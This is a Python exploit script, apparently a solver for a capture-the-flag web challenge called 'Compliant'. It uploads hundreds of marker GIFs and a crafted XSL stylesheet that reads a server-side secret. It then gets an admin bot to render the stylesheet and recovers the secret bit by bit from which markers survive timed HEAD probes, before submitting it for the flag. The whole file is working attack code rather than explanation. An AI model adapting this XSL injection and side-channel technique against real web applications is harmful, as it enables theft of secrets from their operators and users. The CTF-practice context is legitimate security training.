#!/usr/bin/env python3
import argparse
import concurrent.futures
import re
import threading
import time
from typing import Iterable

import requests
import urllib3


ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
SECRET_LENGTH = 20
BITS_PER_CHAR = 5
TOTAL_BITS = SECRET_LENGTH * BITS_PER_CHAR
MARKER_INITIAL_BASE_TTL = 26
MARKER_INITIAL_JITTER = 17
PROBE_OFFSET = 7.0

GIF_1X1 = (
    b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00"
    b"\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,"
    b"\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D"
    b"\x01\x00;"
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
thread_local = threading.local()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Local solver for the Compliant challenge."
    )
    parser.add_argument("--target", default="http://localhost:8443")
    parser.add_argument("--replicas", type=int, default=3)
    parser.add_argument("--workers", type=int, default=48)
    parser.add_argument("--marker-size", type=int, default=512)
    parser.add_argument("--probe-offset", type=float, default=PROBE_OFFSET)
    parser.add_argument("--no-submit", action="store_true")
    return parser.parse_args()


def get_session() -> requests.Session:
    session = getattr(thread_local, "session", None)
    if session is None:
        session = requests.Session()
        session.verify = False
        thread_local.session = session
    return session


def url(target: str, path: str) -> str:
    return target.rstrip("/") + path


def pad_blob(seed: bytes, size: int) -> bytes:
    if len(seed) > size:
        return seed[:size]
    return seed + (b"A" * (size - len(seed)))


def marker_initial_ttl(paper_id: int) -> int:
    return MARKER_INITIAL_BASE_TTL + ((paper_id * 7 + 3) % MARKER_INITIAL_JITTER)


def upload(target: str, data: bytes, content_type: str, filename: str) -> int:
    res = get_session().post(
        url(target, "/upload"),
        files={"file": (filename, data, content_type)},
        allow_redirects=False,
        timeout=30,
    )
    if res.status_code not in (301, 302, 303):
        raise RuntimeError(f"upload failed: HTTP {res.status_code}: {res.text[:200]}")
    location = res.headers.get("Location", "")
    match = re.search(r"/paper/(\d+)$", location)
    if not match:
        raise RuntimeError(f"upload did not return a paper id: {location!r}")
    return int(match.group(1))


def run_parallel(
    label: str,
    items: Iterable,
    workers: int,
    fn,
    progress_every: int = 250,
) -> list:
    items = list(items)
    started = time.monotonic()
    results = []
    completed = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(fn, item) for item in items]
        for future in concurrent.futures.as_completed(futures):
            results.append(future.result())
            completed += 1
            if completed == len(items) or completed % progress_every == 0:
                elapsed = max(time.monotonic() - started, 0.001)
                rate = completed / elapsed
                print(f"[{label}] {completed}/{len(items)} ({rate:.1f}/s)", flush=True)
    return results


def build_xsl(marker_ids: list[list[list[int]]]) -> bytes:
    lines = [
        '<?xml version="1.0" encoding="UTF-8"?>',
        '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">',
        '<xsl:output method="html"/>',
        '<xsl:template match="/">',
        "<html><body>",
        '<xsl:variable name="secret" select="document(\'/secret\')/paper/ink/@value"/>',
    ]

    for pos in range(SECRET_LENGTH):
        for bit in range(BITS_PER_CHAR):
            bit_index = pos * BITS_PER_CHAR + bit
            chars = "".join(
                char for index, char in enumerate(ALPHABET) if index & (1 << bit)
            )
            inverse_chars = "".join(char for char in ALPHABET if char not in chars)
            lines.append(
                f'<xsl:if test="contains(\'{chars}\', substring($secret,{pos + 1},1))">'
            )
            for marker_id in marker_ids[bit_index][1]:
                lines.append(f'<img src="/paper/{marker_id}"/>')
            lines.append("</xsl:if>")
            lines.append(
                f'<xsl:if test="contains(\'{inverse_chars}\', substring($secret,{pos + 1},1))">'
            )
            for marker_id in marker_ids[bit_index][0]:
                lines.append(f'<img src="/paper/{marker_id}"/>')
            lines.append("</xsl:if>")

    lines += ["</body></html>", "</xsl:template>", "</xsl:stylesheet>"]
    return ("\n".join(lines) + "\n").encode()


def head_alive(target: str, paper_id: int) -> bool:
    res = get_session().head(
        url(target, f"/paper/{paper_id}"),
        allow_redirects=False,
        timeout=10,
    )
    return res.status_code == 200


def recover_secret(
    target: str,
    marker_ids: list[list[list[int]]],
    probe_at: dict[int, float],
    workers: int,
) -> str:
    probes = [
        (bit_index, value, replica, marker_id)
        for bit_index, ids in enumerate(marker_ids)
        for value, value_ids in enumerate(ids)
        for replica, marker_id in enumerate(value_ids)
    ]
    probes.sort(key=lambda item: probe_at[item[3]])

    def probe(item):
        bit_index, value, replica, marker_id = item
        delay = probe_at[marker_id] - time.monotonic()
        if delay > 0:
            time.sleep(delay)
        return bit_index, value, replica, head_alive(target, marker_id)

    results = run_parallel("probe", probes, workers, probe, progress_every=250)
    alive_by_bit = [
        [[False] * len(marker_ids[0][0]) for _ in range(2)]
        for _ in range(TOTAL_BITS)
    ]
    for bit_index, value, replica, alive in results:
        alive_by_bit[bit_index][value][replica] = alive

    recovered = []
    print("[recover] per-character bit counts:")
    for pos in range(SECRET_LENGTH):
        value = 0
        counts = []
        for bit in range(BITS_PER_CHAR):
            bit_index = pos * BITS_PER_CHAR + bit
            zero_count = sum(alive_by_bit[bit_index][0])
            one_count = sum(alive_by_bit[bit_index][1])
            counts.append((zero_count, one_count))
            if one_count > zero_count:
                value |= 1 << bit
        if value >= len(ALPHABET):
            raise RuntimeError(
                f"recovered invalid alphabet index {value} at position {pos + 1}; "
                f"counts={counts}"
            )
        recovered.append(ALPHABET[value])
        print(f"  {pos + 1:02d}: {ALPHABET[value]} counts(0,1)={counts}")
    return "".join(recovered)


def main() -> None:
    args = parse_args()
    marker_blob = pad_blob(GIF_1X1, args.marker_size)

    print(f"[+] target: {args.target}")
    print(f"[+] bits: {TOTAL_BITS}, replicas per bit value: {args.replicas}")

    get_session().get(url(args.target, "/"), timeout=10)

    marker_ids: list[list[list[int | None]]] = [
        [[None for _ in range(args.replicas)] for _ in range(2)]
        for _ in range(TOTAL_BITS)
    ]
    probe_at: dict[int, float] = {}
    marker_tasks = [
        (bit_index, value, replica)
        for bit_index in range(TOTAL_BITS)
        for value in range(2)
        for replica in range(args.replicas)
    ]

    def upload_marker(item):
        bit_index, value, replica = item
        paper_id = upload(
            args.target,
            marker_blob,
            "image/gif",
            f"m-{bit_index}-{value}-{replica}.gif",
        )
        uploaded_at = time.monotonic()
        return bit_index, value, replica, paper_id, uploaded_at

    for bit_index, value, replica, paper_id, uploaded_at in run_parallel(
        "markers", marker_tasks, args.workers, upload_marker, progress_every=100
    ):
        marker_ids[bit_index][value][replica] = paper_id
        probe_at[paper_id] = uploaded_at + marker_initial_ttl(paper_id) + args.probe_offset

    typed_marker_ids: list[list[list[int]]] = [
        [[int(value) for value in values] for values in row]
        for row in marker_ids
    ]

    xsl = build_xsl(typed_marker_ids)
    if len(xsl) > 60_000:
        raise RuntimeError(
            f"generated XSL is {len(xsl)} bytes; lower --replicas or compact the payload"
        )
    print(f"[+] xsl payload: {len(xsl)} bytes")
    xsl_id = upload(args.target, xsl, "text/xsl", "leak.xsl")
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<?xml-stylesheet type="text/xsl" href="/paper/{xsl_id}"?>\n'
        "<paper/>\n"
    ).encode()
    xml_id = upload(args.target, xml, "application/xml", "leak.xml")
    print(f"[+] xsl id={xsl_id}, xml id={xml_id}")

    visit = get_session().get(url(args.target, f"/visit/{xml_id}"), timeout=10)
    print(f"[visit] HTTP {visit.status_code}: {visit.text.strip()}")
    if "visiting" not in visit.text:
        raise RuntimeError("bot did not start")

    last_probe_delay = max(probe_at.values()) - time.monotonic()
    print(f"[+] scheduled phased probes over the next {max(last_probe_delay, 0):.1f}s")

    secret = recover_secret(args.target, typed_marker_ids, probe_at, args.workers)
    print(f"[+] recovered secret: {secret}")

    if args.no_submit:
        print("[+] --no-submit set; not calling /flag")
        return

    flag = get_session().get(
        url(args.target, "/flag"),
        params={"secret": secret},
        timeout=10,
    )
    print(f"[flag] HTTP {flag.status_code}: {flag.text.strip()}")


if __name__ == "__main__":
    main()
